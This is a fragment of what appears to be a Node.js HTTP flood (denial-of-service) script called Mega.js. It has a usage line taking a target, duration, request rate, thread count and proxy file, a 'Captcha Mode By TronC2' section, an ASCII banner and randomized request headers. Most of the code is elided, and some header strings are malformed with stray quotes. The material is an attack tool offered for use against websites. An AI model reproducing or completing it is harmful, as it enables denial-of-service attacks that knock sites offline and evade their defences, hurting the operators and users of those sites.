const net = require("net");
 ...
 if (process.argv.length < 7){
	 console.log(`
Usage: node Mega.js [TARGET] [TIME] [REQUEST] [THREAD] [PROXY FILE]`); 
	 process.exit();}
 const headers = {};
 ...
 const cplist = [ // Captcha Mode By TronC2
...
╚═══════════════════════════════════════════════════════════╝`);
 ...
 headers["accept-encoding"] = "gzip, deflate','compress, gzip','deflate, gzip','gzip, identity','*'";
 headers["cache-control"] = "no-cache,no-store,no-transform,only-if-cached, max-age=0,must-revalidate,public, private,proxy-revalidate',s-maxage=86400";
 headers["upgrade-insecure-requests"] = "10"; 
